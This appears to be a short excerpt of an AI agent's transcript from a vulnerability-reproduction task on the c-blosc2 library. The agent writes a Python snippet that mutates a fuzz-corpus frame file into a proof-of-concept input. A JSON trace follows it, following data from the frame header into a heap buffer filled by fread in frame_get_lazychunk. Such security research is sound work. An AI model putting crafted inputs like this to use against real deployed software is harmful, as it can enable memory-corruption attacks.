message:
Running command: cd /workspace/repo-vul/src-vul/c-blosc2 && python - <<'PY'
from pathlib import Path
# build a sparse-frame style directory input from the existing frame corpus by extracting header-ish prefix only
p=Path('tests/fuzz/corpus/frame_simple-blosclz.b2frame')
b=p.read_bytes()
# use a shorter prefix but keep size? maybe target directory-backed path with no cframe; let's make a small input that likely still parses header.
# We will keep the first 256 bytes and pad with zeros to preserve len.
q=bytearray(b[:256]) + bytearray(len(b)-256)
# tweak bytes near expected urlpath/offset metadata zones
for i in range(40, 120):
    q[i] = (q[i] ^ 0x7F) & 0xFF
Path('/workspace/poc.bin').write_bytes(q)
print('wrote', len(q))
PY

  {"step":4,"file":"blosc/frame.c","function":"frame_get_lazychunk","line":1887,"var":"frame","code":"rc = get_header_info(frame, &header_len, &frame_len, &nbytes, &cbytes, &blocksize, &chunksize, &nchunks, &typesize, NULL, NULL, NULL, NULL);","note":"Frame metadata is recovered from input bytes and used to locate chunks."},

  {"step":6,"file":"blosc/frame.c","function":"frame_get_lazychunk","line":1953,"var":"*chunk,needs_free,lazychunk_cbytes","code":"*chunk = malloc(lazychunk_cbytes); *needs_free = true;","note":"A heap lazychunk buffer is allocated because the frame is file-backed."},
  {"step":7,"file":"blosc/frame.c","function":"frame_get_lazychunk","line":1975,"var":"*chunk","code":"rbytes = fread(*chunk, 1, trailer_offset, fp);","note":"Bytes from the crafted frame are copied into the heap buffer."},
